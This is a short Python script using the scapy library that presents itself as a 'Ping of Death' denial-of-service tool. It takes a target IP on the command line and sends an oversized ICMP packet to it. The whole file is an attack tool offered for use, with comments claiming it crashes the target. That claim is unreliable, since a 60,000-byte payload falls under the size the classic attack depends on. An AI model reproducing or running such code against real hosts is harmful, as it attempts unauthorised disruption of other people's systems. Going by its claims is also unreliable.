# Usage : python ping_of_death.py -t <target_ip>

from scapy.all import *
import argparse

def ping_of_death(target_ip):
    # Send a large ICMP packet to crash the target system
    send(IP(dst=target_ip)/ICMP()/("X"*60000), verbose=0) # Send a large ICMP packet with 60,000 bytes of data to crash the target system

def main():
    parser = argparse.ArgumentParser(description='Ping of Death Attack')
    parser.add_argument('-t', '--target', help='Target IP', required=True)
    args = parser.parse_args()

    ping_of_death(args.target)

if __name__ == '__main__':
    main()
    